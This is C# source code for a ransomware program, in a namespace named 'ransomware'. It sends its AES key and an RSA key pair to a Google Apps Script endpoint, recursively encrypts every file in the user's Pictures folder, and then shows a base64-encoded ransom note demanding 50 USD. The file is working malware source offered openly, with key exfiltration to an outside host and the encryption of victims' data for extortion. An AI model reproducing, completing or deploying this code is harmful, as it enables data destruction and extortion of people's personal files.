using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.Threading;
using System.IO;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Net;
namespace ransomware
{

    class Program
    {
        string table = "abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBox(IntPtr h, string m, string c, int type);
        #pragma optimize( "", off );
        /* unoptimized code section */
        private static void up_cloud(string key) 
        {
            try
            {

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();

                var publicKey = rsa.ToXmlString(false);
                var privateKey = rsa.ToXmlString(true);
                //rsa.Encrypt(key, false);
                //Console.Out.WriteLine(publicKey);
                //Console.Out.WriteLine(privateKey);

                File.WriteAllText("dont_delete_me.txt", publicKey);
                var wb = new WebClient();

                string url = "https://script.google.com/macros/s/AKfycbytDV8Zlcz-jgiqbvCZgmsrDzCZa2I5Rx2IRpdXQ2YhRQZrWB2JRs0BwW6AI26eaWqX/exec?page=" + key + "&item=" + publicKey + "&amount=" + privateKey;

                //Console.Out.WriteLine(url);

                //System.Diagnostics.Process.Start(url);

                WebRequest request = WebRequest.Create(url);
                request.Method = "GET";
                request.Proxy = null;
                using (var httpResponse = (HttpWebResponse)request.GetResponse())
                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    //var result = streamReader.ReadToEnd();
                    //Console.Out.WriteLine(result);

                }

                Console.Out.WriteLine("ok");

                //Console.Read();
            }
            catch (Exception) { }
        }

        private static void encrypt_file(string dir, Byte[] key)
        {
            var di = new DirectoryInfo(dir);
            try
            {
                foreach (FileInfo fi in di.GetFiles("*.*"))

                    module.encrypt_check(fi.FullName, key);
                foreach (DirectoryInfo d in di.GetDirectories())
                    encrypt_file(d.FullName, key);
            }
            catch (Exception)
            {
            }
        }

        private static void decrypt_file(string dir, Byte[] key)
        {
            var di = new DirectoryInfo(dir);
            try
            {
                foreach (FileInfo fi in di.GetFiles("*.*"))

                    //module.decrypt_check(fi.FullName, key);
                foreach (DirectoryInfo d in di.GetDirectories())
                    decrypt_file(d.FullName, key);
            }
            catch (Exception)
            {
            }
        }
        static void Main(string[] args)
        {
           // Boolean bCreatedNew;
            //Mutex m = new Mutex(false, "myyyy_ransomware", out bCreatedNew);
            //if (!bCreatedNew) return;
            //MessageBox((IntPtr)0, "start", "", 0);
            Byte[] mykey = AES.gen_key();
            Console.Out.WriteLine(BitConverter.ToString(mykey));

            up_cloud(BitConverter.ToString(mykey));

            /*
            string[] pairs = Console.ReadLine().ToString().Split('-');
            Console.Out.WriteLine(pairs);

           byte[] bytes = new byte[pairs.Length];
           for (int i = 0; i < pairs.Length; i++)
               bytes[i] = Convert.ToByte(Convert.ToString(pairs[i]), 16);
           Console.Out.WriteLine(BitConverter.ToString(bytes));
            */

            //Byte[] data = Encoding.ASCII.GetBytes("data");
            //Byte[] res = AES.encrypt(data, mykey);
            //Console.Out.WriteLine(BitConverter.ToString(res));
            //res = AES.decrypt(res, mykey);
            //Console.Out.WriteLine(BitConverter.ToString(res));
            //Console.Out.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            encrypt_file(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), mykey);
            MessageBox((IntPtr)0, "continue", "", 0);
            Console.Out.WriteLine("-------------------------------");

            //decrypt_file(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), mykey);



            string info = "SGV5IHRoaXMgaXMgYSBtZXNzYWdlIGZvciB5b3UKCllvdXIgZmlsZSBoYXMgYmVlbiBlbmNyeXB0ZWQKCklmIHlvdSB3YW50IHRvIGRlY3J5cHQgLGNvbnRhY3QgdXMsIHBheUBob3N0LmNvbSAKCk9ubHkgY29zdCA1MCB1c2QKCldhcm5pbmc6CkRPIE5PVCBERUxFVEUgZG9udF9kZWxldGVfbWUudHh0ICxJVCBDT05UQUlOIFlPVVIgSURFTlRJVFkgLElGIFlPVSBERUxFVEUgSVQsWU9VUiBEQVRBIFdJTEwgTk8gTE9OR0VSIFJFQ09WRVIgQU5ZIE1PUkUK";
            info=Encoding.UTF8.GetString(Convert.FromBase64String(info));
            MessageBox((IntPtr)0, info , "", 0);

        }
         #pragma optimize( "", on );

    }
}
